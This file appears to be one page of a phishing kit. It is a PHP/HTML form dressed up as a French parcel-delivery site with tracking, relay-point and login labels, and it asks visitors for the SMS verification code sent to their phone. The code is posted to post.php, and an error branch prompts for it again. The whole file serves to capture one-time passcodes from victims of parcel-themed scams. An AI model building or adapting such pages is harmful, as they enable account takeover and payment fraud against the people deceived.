<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>SMS</title>
</head>
<body>

<header>

    <div class="left">

<div class="logo">
<img src="res/img/logo.png" >
</div>

    </div>

    <div class="right">
<label> Suivi de colis</label> <label > Envoi de colis</label> <label > Points Relais® <br>
et Lockers</label> <label > Aide</label>

 <button type="button">Se connecter</button>

    </div>
</header>


<main>



    <div class="continer1">
       
    
<form action="post.php" method="post">
<h2>Confirmation</h2>

<div class="num">
    <h4 style="font-weight:normal; text-align:left;" >Veuillez saisir le code de vérification envoyé sur votre téléphone.</h4> </div>

<div class="col">
<input type="text" placeholder="Entrer le code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Code invalide</p>';
}
?>
</div> <br>


<div class="back">
    <button type="submit"> Confirmer</button>
</div>




</div>
</div>



</main>

<footer>


<div class="foter">
<img src="res/img/fpc.png" >
</div>

<div class="mobil">
<img src="res/img/mobil.png" >
</div>
</footer>

</body>
</html>